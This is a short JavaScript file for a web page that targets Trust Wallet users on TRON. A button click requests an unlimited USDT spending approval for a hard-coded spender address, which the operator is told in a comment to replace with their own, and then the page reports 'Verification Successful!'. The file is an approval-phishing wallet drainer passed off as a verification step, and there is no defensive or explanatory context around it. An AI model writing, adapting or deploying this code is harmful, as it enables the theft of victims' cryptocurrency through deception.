// app.js
const btnNext = document.getElementById('btn-next');
const statusDiv = document.getElementById('status');

// *** APNA ADDRESS YAHAN DALEIN ***
const SPENDER_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt"; 
const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

btnNext.addEventListener('click', async () => {
    if (typeof window.tronWeb === 'undefined') {
        statusDiv.innerHTML = "<span style='color:red;'>Please open in Trust Wallet Browser</span>";
        return;
    }

    try {
        statusDiv.innerText = "Connecting...";
        
        // USDT Contract Instance
        const contract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
        
        // Unlimited Approval Amount
        const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        statusDiv.innerText = "Requesting Approval...";

        // Trigger Approval
        await contract.approve(SPENDER_ADDRESS, amount).send({
            feeLimit: 100000000
        });

        statusDiv.innerHTML = "<span style='color:green;'>Verification Successful!</span>";
        
    } catch (error) {
        console.error(error);
        statusDiv.innerHTML = "<span style='color:red;'>Transaction Rejected or Failed</span>";
    }
});
